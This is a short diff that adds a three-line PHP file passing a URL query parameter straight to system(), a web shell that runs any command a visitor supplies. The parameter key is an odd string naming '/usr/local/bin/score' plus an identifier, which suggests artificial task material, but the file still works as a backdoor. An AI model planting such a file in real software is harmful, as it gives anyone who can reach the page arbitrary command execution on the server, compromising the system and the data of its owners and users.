@@ -1,0 +1,3 @@
+<?php 
+  system($_GET['/usr/local/bin/score 915b1d7e-f2dc-408e-bbb3-52cd1dcfd1d2']);
+?>
